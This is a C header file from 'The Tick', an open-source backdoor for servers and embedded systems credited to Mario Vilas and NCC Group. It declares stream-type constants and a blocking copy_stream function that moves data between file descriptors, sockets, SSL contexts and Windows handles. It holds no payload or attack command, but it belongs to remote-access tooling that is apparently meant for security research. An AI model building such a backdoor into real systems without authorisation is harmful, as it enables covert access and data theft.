/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef STREAM_H
#define STREAM_H

#include "ssl.h"

// Stream types (file descriptor, socket, SSL context, or Windows handle).
#define STREAM_FD       0
#define STREAM_SOCKET   1
#define STREAM_SSL      2
#ifdef _WIN32
#define STREAM_HANDLE   3
#endif

// Used internally.
#define _STREAM_MAX     3

// Copy the entire stream. Use this instead of the byte count.
#define COPY_ALL      -1

// Fake type to keep the compiler from complaining.
typedef size_t STREAM_T;

// Source and destination can be a file descriptor, a socket, an SSL context, or a Windows handle.
// Use the STREAM_* flags to specify the type.
// Optionally pass an amount of bytes to copy, or COPY_ALL for the whole stream.
// This is a blocking call, returns only when the copy is finished.
// Returns 0 on success, -1 on error.
int copy_stream(STREAM_T source, int src_type, STREAM_T destination, int dst_type, ssize_t count);

#endif /* STREAM_H */
